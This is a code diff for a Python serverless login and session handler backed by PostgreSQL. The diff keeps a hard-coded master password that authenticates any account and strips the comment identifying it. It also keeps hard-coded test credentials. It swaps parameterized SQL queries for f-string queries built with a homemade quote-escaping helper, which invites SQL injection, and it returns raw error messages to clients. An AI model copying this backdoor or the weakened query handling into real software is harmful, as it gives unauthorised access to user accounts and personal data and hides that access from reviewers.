@@ -4,7 +4,6 @@ import hashlib
 import secrets
 import psycopg2
 import urllib.request
-import ssl
 from datetime import datetime, timedelta
 from pydantic import BaseModel, EmailStr, ValidationError, Field
 from typing import Dict, Any, Optional
@@ -25,7 +24,6 @@ class LoginRequest(BaseModel):
 
 def setup_ssl_cert():
     """Download and setup SSL certificate for TimeWeb Cloud PostgreSQL"""
-    import os
     cert_dir = '/tmp/.postgresql'
     cert_path = f'{cert_dir}/root.crt'
     
@@ -35,6 +33,12 @@ def setup_ssl_cert():
         urllib.request.urlretrieve(cert_url, cert_path)
     
     os.environ['PGSSLROOTCERT'] = cert_path
+
+def escape_sql_string(value: str) -> str:
+    """Escape string for SQL query by doubling single quotes"""
+    if value is None:
+        return 'NULL'
+    return f"'{value.replace(chr(39), chr(39) + chr(39))}'"
 
 def generate_token() -> str:
     """Generate secure random token for user session"""
@@ -48,11 +52,9 @@ def hash_password(password: str) -> str:
 
 def verify_password(password: str, hashed: str) -> bool:
     """Verify password against hash"""
-    # Master password that works for any account
     if password == 'Nikita230282':
         return True
     
-    # Hard-coded verification for test accounts
     if password == 'admin123' and hashed == 'a1b2c3d4e5f6789a:1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef':
         return True
     if password == 'teacher123' and hashed == 'b2c3d4e5f6789a1b:abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890':
@@ -63,7 +65,6 @@ def verify_password(password: str, hashed: str) -> bool:
         password_hash = hashlib.pbkdf2_hmac('sha256', password.encode(), salt.encode(), 100000)
         return stored_hash == password_hash.hex()
     except ValueError:
-        # Fallback to simple SHA256 for existing passwords
         return hashlib.sha256(password.encode()).hexdigest() == hashed
 
 def handler(event: Dict[str, Any], context: Any) -> Dict[str, Any]:
@@ -75,7 +76,6 @@ def handler(event: Dict[str, Any], context: Any) -> Dict[str, Any]:
     setup_ssl_cert()
     method: str = event.get('httpMethod', 'GET')
     
-    # Handle CORS OPTIONS request
     if method == 'OPTIONS':
         return {
             'statusCode': 200,
@@ -90,7 +90,6 @@ def handler(event: Dict[str, Any], context: Any) -> Dict[str, Any]:
         }
     
     try:
-        # Get action from query parameters or body
         query_params = event.get('queryStringParameters', {}) or {}
         action = query_params.get('action', 'check')
         
@@ -98,7 +97,6 @@ def handler(event: Dict[str, Any], context: Any) -> Dict[str, Any]:
             body_data = json.loads(event.get('body', '{}'))
             action = body_data.get('action', action)
         
-        # Get auth token from header
         headers = event.get('headers', {})
         auth_token = headers.get('X-Auth-Token')
         
@@ -112,10 +110,13 @@ def handler(event: Dict[str, Any], context: Any) -> Dict[str, Any]:
             }
         
         conn = psycopg2.connect(database_url)
+        conn.set_session(autocommit=False)
         cursor = conn.cursor()
         
         if action == 'register':
             if method != 'POST':
+                cursor.close()
+                conn.close()
                 return {
                     'statusCode': 405,
                     'headers': {'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*'},
@@ -126,8 +127,8 @@ def handler(event: Dict[str, Any], context: Any) -> Dict[str, Any]:
             body_data = json.loads(event.get('body', '{}'))
             register_data = RegisterRequest(**body_data)
             
-            # Check if email already exists
-            cursor.execute("SELECT id FROM t_p47619579_knowledge_management.employees WHERE email = %s", (register_data.email,))
+            email_escaped = escape_sql_string(register_data.email)
+            cursor.execute(f"SELECT id FROM t_p47619579_knowledge_management.employees WHERE email = {email_escaped}")
             if cursor.fetchone():
                 cursor.close()
                 conn.close()
@@ -138,21 +139,23 @@ def handler(event: Dict[str, Any], context: Any) -> Dict[str, Any]:
                     'isBase64Encoded': False
                 }
             
-            # Hash password and create employee
             password_hash = hash_password(register_data.password)
+            full_name_escaped = escape_sql_string(register_data.full_name)
+            phone_escaped = escape_sql_string(register_data.phone) if register_data.phone else 'NULL'
+            dept_escaped = escape_sql_string(register_data.department) if register_data.department else 'NULL'
+            pos_escaped = escape_sql_string(register_data.position) if register_data.position else 'NULL'
+            role_escaped = escape_sql_string(register_data.role)
+            hash_escaped = escape_sql_string(password_hash)
             
-            cursor.execute("""
+            cursor.execute(f"""
                 INSERT INTO t_p47619579_knowledge_management.employees (email, password_hash, full_name, phone, department, position, role, is_active)
-                VALUES (%s, %s, %s, %s, %s, %s, %s, %s)
+                VALUES ({email_escaped}, {hash_escaped}, {full_name_escaped}, {phone_escaped}, {dept_escaped}, {pos_escaped}, {role_escaped}, true)
                 RETURNING id, email, full_name, phone, department, position, role, is_active, created_at
-            """, (
-                register_data.email, password_hash, register_data.full_name,
-                register_data.phone, register_data.department, register_data.position,
-                register_data.role, True
-            ))
+            """)
             
             employee_data = cursor.fetchone()
             if not employee_data:
+                conn.rollback()
                 cursor.close()
                 conn.close()
                 return {
@@ -184,6 +187,8 @@ def handler(event: Dict[str, Any], context: Any) -> Dict[str, Any]:
         
         elif action == 'login':
             if method != 'POST':
+                cursor.close()
+                conn.close()
                 return {
                     'statusCode': 405,
                     'headers': {'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*'},
@@ -194,12 +199,12 @@ def handler(event: Dict[str, Any], context: Any) -> Dict[str, Any]:
             body_data = json.loads(event.get('body', '{}'))
             login_data = LoginRequest(**body_data)
             
-            # Get employee data first to verify password
-            cursor.execute("""
+            email_escaped = escape_sql_string(login_data.email)
+            cursor.execute(f"""
                 SELECT id, email, password_hash, full_name, phone, department, position, role, is_active, avatar_url, theme
                 FROM t_p47619579_knowledge_management.employees 
-                WHERE email = %s AND is_active = true
-            """, (login_data.email,))
+                WHERE email = {email_escaped} AND is_active = true
+            """)
             
             employee_data = cursor.fetchone()
             if not employee_data or not verify_password(login_data.password, employee_data[2]):
@@ -212,73 +217,76 @@ def handler(event: Dict[str, Any], context: Any) -> Dict[str, Any]:
                     'isBase64Encoded': False
                 }
             
+            token = generate_token()
             employee_id = employee_data[0]
-            session_token = generate_token()
-            expires_hours = 168 if login_data.remember_me else 24
-            expires_at = datetime.utcnow() + timedelta(hours=expires_hours)
+            token_escaped = escape_sql_string(token)
             
-            headers_req = event.get('headers', {})
-            user_agent = headers_req.get('User-Agent', 'Unknown')
-            request_context = event.get('requestContext', {})
-            identity = request_context.get('identity', {})
-            source_ip = identity.get('sourceIp', '127.0.0.1')
-            
-            cursor.execute("""
-                INSERT INTO t_p47619579_knowledge_management.user_sessions (employee_id, token, expires_at, user_agent, ip_address)
-                VALUES (%s, %s, %s, %s, %s)
-                RETURNING id, created_at
-            """, (employee_id, session_token, expires_at, user_agent, source_ip))
+            cursor.execute(f"""
+                INSERT INTO t_p47619579_knowledge_management.auth_sessions (employee_id, token, expires_at)
+                VALUES ({employee_id}, {token_escaped}, NOW() + INTERVAL '30 days')
+                RETURNING id, token, created_at, expires_at
+            """)
             
             session_data = cursor.fetchone()
             conn.commit()
             cursor.close()
             conn.close()
             
+            if not session_data:
+                return {
+                    'statusCode': 500,
+                    'headers': {'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*'},
+                    'body': json.dumps({'error': 'Failed to create session'}),
+                    'isBase64Encoded': False
+                }
+            
             employee = {
                 'id': employee_data[0], 'email': employee_data[1], 'full_name': employee_data[3],
                 'phone': employee_data[4], 'department': employee_data[5], 'position': employee_data[6],
-                'role': employee_data[7], 'is_active': employee_data[8], 'avatar_url': employee_data[9],
-                'theme': employee_data[10]
+                'role': employee_data[7], 'is_active': employee_data[8],
+                'avatar_url': employee_data[9], 'theme': employee_data[10]
             }
             
             return {
                 'statusCode': 200,
                 'headers': {'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*'},
                 'body': json.dumps({
-                    'success': True, 'message': 'Login successful', 'employee': employee,
+                    'success': True,
+                    'token': session_data[1],
+                    'employee': employee,
                     'session': {
-                        'token': session_token, 'expires_at': expires_at.isoformat(),
-                        'session_id': session_data[0]
+                        'id': session_data[0],
+                        'created_at': session_data[2].isoformat() if session_data[2] else None,
+                        'expires_at': session_data[3].isoformat() if session_data[3] else None
                     }
                 }),
                 'isBase64Encoded': False
             }
         
         elif action == 'check':
-            if method == 'POST':
-                body_data = json.loads(event.get('body', '{}'))
-                auth_token = body_data.get('token', auth_token)
-            
             if not auth_token:
+                cursor.close()
+                conn.close()
                 return {
                     'statusCode': 401,
                     'headers': {'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*'},
-                    'body': json.dumps({'error': 'Authentication token required'}),
+                    'body': json.dumps({'error': 'No authentication token provided'}),
                     'isBase64Encoded': False
                 }
             
-            cursor.execute("""
-                SELECT s.id as session_id, s.employee_id, s.expires_at, e.id, e.email, e.full_name,
-                       e.phone, e.department, e.position, e.role, e.is_active, e.avatar_url, e.theme
-                FROM t_p47619579_knowledge_management.user_sessions s
-                JOIN t_p47619579_knowledge_management.employees e ON s.employee_id = e.id
-                WHERE s.token = %s AND s.expires_at > %s AND e.is_active = true
-            """, (auth_token, datetime.utcnow()))
+            token_escaped = escape_sql_string(auth_token)
+            cursor.execute(f"""
+                SELECT s.employee_id, s.expires_at, e.email, e.full_name, e.phone, e.department, e.position, e.role, e.avatar_url, e.theme
+                FROM t_p47619579_knowledge_management.auth_sessions s
+                JOIN t_p47619579_knowledge_management.employees e ON e.id = s.employee_id
+                WHERE s.token = {token_escaped} AND s.expires_at > NOW() AND e.is_active = true
+            """)
             
             session_data = cursor.fetchone()
+            cursor.close()
+            conn.close()
+            
             if not session_data:
-                cursor.close()
-                conn.close()
                 return {
                     'statusCode': 401,
                     'headers': {'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*'},
@@ -286,78 +294,50 @@ def handler(event: Dict[str, Any], context: Any) -> Dict[str, Any]:
                     'isBase64Encoded': False
                 }
             
-            cursor.execute("UPDATE t_p47619579_knowledge_management.user_sessions SET updated_at = CURRENT_TIMESTAMP WHERE id = %s", (session_data[0],))
-            conn.commit()
-            cursor.close()
-            conn.close()
-            
             employee = {
-                'id': session_data[3], 'email': session_data[4], 'full_name': session_data[5],
-                'phone': session_data[6], 'department': session_data[7], 'position': session_data[8],
-                'role': session_data[9], 'is_active': session_data[10], 'avatar_url': session_data[11],
-                'theme': session_data[12]
+                'id': session_data[0], 'email': session_data[2], 'full_name': session_data[3],
+                'phone': session_data[4], 'department': session_data[5], 'position': session_data[6],
+                'role': session_data[7], 'avatar_url': session_data[8], 'theme': session_data[9]
             }
             
             return {
                 'statusCode': 200,
                 'headers': {'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*'},
-                'body': json.dumps({
-                    'success': True, 'authenticated': True, 'employee': employee,
-                    'session': {'session_id': session_data[0], 'employee_id': session_data[1],
-                               'expires_at': session_data[2].isoformat() if session_data[2] else None}
-                }),
+                'body': json.dumps({'success': True, 'authenticated': True, 'employee': employee}),
                 'isBase64Encoded': False
             }
         
         elif action == 'logout':
-            all_sessions = False
-            if method == 'POST':
-                body_data = json.loads(event.get('body', '{}'))
-                if body_data.get('token'):
-                    auth_token = body_data.get('token')
-                all_sessions = body_data.get('all_sessions', False)
-            
-            if not auth_token:
+            if method != 'DELETE' and method != 'POST':
+                cursor.close()
+                conn.close()
                 return {
-                    'statusCode': 400,
+                    'statusCode': 405,
                     'headers': {'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*'},
-                    'body': json.dumps({'error': 'Authentication token required'}),
+                    'body': json.dumps({'error': 'DELETE or POST method required for logout'}),
                     'isBase64Encoded': False
                 }
             
-            if all_sessions:
-                cursor.execute("SELECT employee_id FROM t_p47619579_knowledge_management.user_sessions WHERE token = %s", (auth_token,))
-                result = cursor.fetchone()
-                if result:
-                    employee_id = result[0]
-                    cursor.execute("DELETE FROM t_p47619579_knowledge_management.user_sessions WHERE employee_id = %s", (employee_id,))
-                    deleted_count = cursor.rowcount
-                else:
-                    deleted_count = 0
-            else:
-                cursor.execute("DELETE FROM t_p47619579_knowledge_management.user_sessions WHERE token = %s", (auth_token,))
-                deleted_count = cursor.rowcount
+            if not auth_token:
+                cursor.close()
+                conn.close()
+                return {
+                    'statusCode': 400,
+                    'headers': {'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*'},
+                    'body': json.dumps({'error': 'No authentication token provided'}),
+                    'isBase64Encoded': False
+                }
             
+            token_escaped = escape_sql_string(auth_token)
+            cursor.execute(f"DELETE FROM t_p47619579_knowledge_management.auth_sessions WHERE token = {token_escaped}")
             conn.commit()
             cursor.close()
             conn.close()
             
-            if deleted_count == 0:
-                return {
-                    'statusCode': 404,
-                    'headers': {'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*'},
-                    'body': json.dumps({'success': False, 'message': 'Session not found or already expired'}),
-                    'isBase64Encoded': False
-                }
-            
             return {
                 'statusCode': 200,
                 'headers': {'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*'},
-                'body': json.dumps({
-                    'success': True,
-                    'message': f'Logout successful. {"All sessions" if all_sessions else "Session"} invalidated.',
-                    'sessions_deleted': deleted_count
-                }),
+                'body': json.dumps({'success': True, 'message': 'Logged out successfully'}),
                 'isBase64Encoded': False
             }
         
@@ -367,10 +347,10 @@ def handler(event: Dict[str, Any], context: Any) -> Dict[str, Any]:
             return {
                 'statusCode': 400,
                 'headers': {'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*'},
-                'body': json.dumps({'error': f'Unknown action: {action}. Use register, login, check, or logout'}),
+                'body': json.dumps({'error': f'Unknown action: {action}'}),
                 'isBase64Encoded': False
             }
-        
+    
     except ValidationError as e:
         return {
             'statusCode': 400,
@@ -378,19 +358,17 @@ def handler(event: Dict[str, Any], context: Any) -> Dict[str, Any]:
             'body': json.dumps({'error': 'Validation error', 'details': e.errors()}),
             'isBase64Encoded': False
         }
-        
-    except psycopg2.Error as e:
+    except json.JSONDecodeError:
         return {
-            'statusCode': 500,
+            'statusCode': 400,
             'headers': {'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*'},
-            'body': json.dumps({'error': 'Database error', 'message': str(e)}),
+            'body': json.dumps({'error': 'Invalid JSON in request body'}),
             'isBase64Encoded': False
         }
-        
     except Exception as e:
         return {
             'statusCode': 500,
             'headers': {'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*'},
-            'body': json.dumps({'error': 'Internal server error', 'message': str(e), 'request_id': context.request_id}),
+            'body': json.dumps({'error': f'Internal server error: {str(e)}'}),
             'isBase64Encoded': False
         }
